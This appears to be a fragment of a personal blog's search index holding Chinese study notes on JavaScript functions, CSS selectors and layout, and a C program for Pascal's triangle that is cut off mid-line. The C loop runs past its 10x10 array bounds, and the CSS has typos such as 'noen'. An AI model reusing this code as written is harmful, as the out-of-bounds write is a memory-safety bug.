class="line"><span class="comment"><span class="language-javascript">   &#125; */</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">//效果相同</span></span></span><br><span class="line"><span class="language-javascript">   mysum = <span class="keyword">function</span>(<span class="params">a, b</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">return</span> a + b; <span class="comment">//返回计算结果!</span></span></span><br><span class="line"><span class="language-javascript">   &#125;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 调用函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> result = <span class="title function_">mysum</span>(<span class="number">10</span>, <span class="number">20</span>);</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(result)</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">//定义一个函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">function</span> <span class="title function_">sayHello</span>(<span class="params">username</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(<span class="string">&quot;欢迎&quot;</span> + username + <span class="string">&quot;光临！&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">   &#125;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 在事件句柄当中调用sayHello函数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;sayHello(&#x27;李四&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS学习笔记</title>
      <link href="/2023/03/07/CSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/07/CSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="承接HTML学习笔记"><a href="#承接HTML学习笔记" class="headerlink" title="承接HTML学习笔记"></a>承接HTML学习笔记</h1><p>附上动力节点网课视频</p><h2 id="CSS概述和在HTML中嵌入CSS样式的三种方式"><a href="#CSS概述和在HTML中嵌入CSS样式的三种方式" class="headerlink" title="CSS概述和在HTML中嵌入CSS样式的三种方式"></a>CSS概述和在HTML中嵌入CSS样式的三种方式</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>CSS概述<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>什么是CSS？<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;nbsp;</span>  CSS:Cascading Style Sheet(层叠样式语言).CSS是一种样式表语言。专门用来修饰HTML页面的。让HTML页面更好看。</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;nbsp;</span>  CSS是HTML的化妆品.CSS是离不开HTML的，CSS离开了HTML就没有意义了，所以还是新建HTML文件，编写HTML代码，HTML代码中编写央视，修饰HTML节点。</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>在HTML嵌入CSS样式的第一种方式<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--内联定义--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--盒子--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">内联定义的语法格式：</span></span><br><span class="line"><span class="comment">&lt;标签 style=&quot;样式名：样式值;样式名：样式值&quot;&gt;&lt;/标签&gt;</span></span><br><span class="line"><span class="comment">样式可通过查找帮助文档来获取</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div1&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100px;height: 100px;background-color: #66FF66;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>在HTML嵌入CSS样式的第二种方式<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--样式块对象--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 这是CSS的注释*(与HTML不同) */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 设置id=&quot;div2&quot;元素的宽度高度和颜色 */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-css">设置某个元素的样式，首先你要选中这个元素，怎么选中一个或多个元素呢？</span></span></span><br><span class="line"><span class="comment"><span class="language-css">常见的选择元素的方式有三种：（这里说的是常见的）</span></span></span><br><span class="line"><span class="comment"><span class="language-css">id选择器</span></span></span><br><span class="line"><span class="comment"><span class="language-css">标签选择器</span></span></span><br><span class="line"><span class="comment"><span class="language-css">类选择器</span></span></span><br><span class="line"><span class="comment"><span class="language-css">*/</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 关于id选择器 */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/* id选择器只能作用于当前页面的一个节点，因为id是不能重复的 */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#div2</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: greenyellow;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 标签选择器 */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 作用于当前页面中所有的input元素 */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">input</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* border-color: red;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">border-style: dashed;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">border-width: 1px; */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 总样式 */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">border</span>: <span class="number">1px</span> solid black;<span class="comment">/* 宽度 样式 颜色 */</span></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* id选择器的优先级比标签选择器高 */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#email</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">border</span>: <span class="number">20px</span> dashed red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 类选择器 */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.student</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: <span class="number">#0000FF</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 以上三种选择器的优先级</span></span></span><br><span class="line"><span class="comment"><span class="language-css">id选择器&gt;类选择器&gt;标签选择器 */</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div2&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">用户名<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">密码<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">邮箱地址：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 在HTML中，任何一个节点元素都有class属性，用来指定标签类名--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--以下虽然标签不同，但是它们的都属于同一类。为什么？因为类名相同--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;student&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;student&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;student&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>在HTML嵌入CSS样式的第三种方式<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--引入外部独立的CSS样式表文件--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--实际开发中较多使用这种方式，可以降低维护成本，修改一个文件即可--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;C:/Users/yxz/Desktop/css/my.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>附.css文件代码</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#div1</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#ADFF2F</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line"><span class="attribute">position</span>: absolute; <span class="comment">/* 绝对定位 */</span></span><br><span class="line"><span class="comment">/* 绝对定位的时候只要设置x轴和y轴坐标即可 */</span></span><br><span class="line"><span class="attribute">top</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">500px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#div2</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">background</span>: red;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line"><span class="attribute">position</span>: absolute; <span class="comment">/* 绝对定位 */</span></span><br><span class="line"><span class="attribute">top</span>: <span class="number">300px</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">600px</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/07/AH8Xvk5FiMraCQL.png" alt="css.png"></p><h3 id="常见CSS样式"><a href="#常见CSS样式" class="headerlink" title="常见CSS样式"></a>常见CSS样式</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>常用的CSS样式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--样式块--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.numbers</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">display</span>: none; <span class="comment">/*  block */</span> </span></span><br><span class="line"><span class="language-css"><span class="comment">/* </span></span></span><br><span class="line"><span class="comment"><span class="language-css">display样式</span></span></span><br><span class="line"><span class="comment"><span class="language-css">1.属于布局样式</span></span></span><br><span class="line"><span class="comment"><span class="language-css">2.用来设置显示或者隐藏</span></span></span><br><span class="line"><span class="comment"><span class="language-css">3.隐藏：none</span></span></span><br><span class="line"><span class="comment"><span class="language-css">4.显示：block或者inline-bloc</span></span></span><br><span class="line"><span class="comment"><span class="language-css">block：以块的形式展现，并且独自占用一行</span></span></span><br><span class="line"><span class="comment"><span class="language-css">inline-block：以块的形式展现，但是不会自己独自占用一行</span></span></span><br><span class="line"><span class="comment"><span class="language-css">*/</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#nameError</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">font-size</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.baidu</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">text-decoration</span>: none;<span class="comment">/* underline */</span></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#cc</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">list-style-type</span>: noen;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* :hover专门用来设置鼠标悬停效果的 */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/*使用hover的时候:俩边不能出现空格*/</span></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#bgpowernode</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css"><span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.div5</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: <span class="number">#444</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">border</span>: <span class="number">34px</span> red solid;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 在元素外边打补丁 */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">margin-top</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">margin-left</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 内补丁 */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">padding-right</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#outdiv</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: blue;</span></span><br><span class="line"><span class="language-css"><span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#innerdiv</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 设置当前节点元素的浮动效果，只是浮动于当前元素的父元素内部 */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#mydiv2</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 绝对定位 */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css"><span class="attribute">top</span>: <span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">left</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--设置鼠标悬停效果--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--鼠标移动到以下文本上，字体颜色变红，鼠标变小手--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;bgpowernode&quot;</span>&gt;</span>柚子皮<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--无序列表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;cc&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>a</span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;numbers&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>b</span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;numbers&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>c</span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;numbers&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--字体样式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;nameError&quot;</span>&gt;</span>用户名不能为空<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文本装饰--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;baidu&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http:www.baidu.com&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--内补丁，外补丁--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div5&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--浮动效果--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;outdiv&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;innerdiv&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;mydiv2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/09/VpQUdCGtHbAniZ8.png" alt="image.png"></p><h3 id="暂停于此"><a href="#暂停于此" class="headerlink" title="暂停于此"></a>暂停于此</h3>]]></content>
      
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C的笔记</title>
      <link href="/2023/03/05/C%E7%9A%84%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/05/C%E7%9A%84%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="杨辉三角"><a href="#杨辉三角" class="headerlink" title="杨辉三角"></a>杨辉三角</h3><p>数组要初始化<br>找规律</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 1 1</span></span><br><span class="line"><span class="comment">// 1 2 1</span></span><br><span class="line"><span class="comment">// 1 3 3 1</span></span><br><span class="line"><span class="comment">// 1 4 6 4 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>][<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//第一列全1</span></span><br><span class="line">            <span class="keyword">if</span> (j == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                arr[i][j] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//对角线全1</span></span><br><span class="line">            <span class="keyword">if</span> (i == j)</span><br><span class="line">            &#123;</span><br><span class="line">                arr[i][j] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= <span class="number">2</span> &amp;&amp; j &gt;= <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                arr[i][j] = arr[i <span class="number">-1</span>][j - <span class="number">1</span>] + arr[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span 